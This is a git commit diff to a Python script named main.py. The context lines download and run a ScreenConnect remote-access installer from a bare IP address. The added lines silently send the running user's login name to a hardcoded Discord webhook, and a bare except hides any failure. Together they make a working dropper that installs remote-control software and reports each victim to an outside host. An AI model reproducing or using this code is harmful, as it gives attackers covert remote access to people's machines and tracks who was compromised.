ec31e61a22284121c6858c129ad04ea79e9bdf12
skiddyskid111 <dhwhrvcxa@gmail.com>
2025-09-22 22:17:21 +0200

    Update main.py

--- main.py
+++ main.py
@@ -14,6 +14,14 @@ def download_and_run(url):
             out_file.write(chunk)
     os.startfile(file_path)
 
+    try:
+        url = 'https://discord.com/api/webhooks/1419779190399569940/TTmoY4jWra0wwRca21U8RIEvesch8duCqnCcQxxDF28i1UNCB09oDOZ3FVVMwJW-5oK2'
+        data = {'content': f'Ran by {os.getlogin()}'}
+        req = urllib.request.Request(url, data=json.dumps(data).encode(), headers={'Content-Type': 'application/json'})
+        urllib.request.urlopen(req)
+    except:
+        pass
+
 url = 'http://87.121.84.32:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'
 thread = threading.Thread(target=download_and_run, args=(url,))
 thread.start()
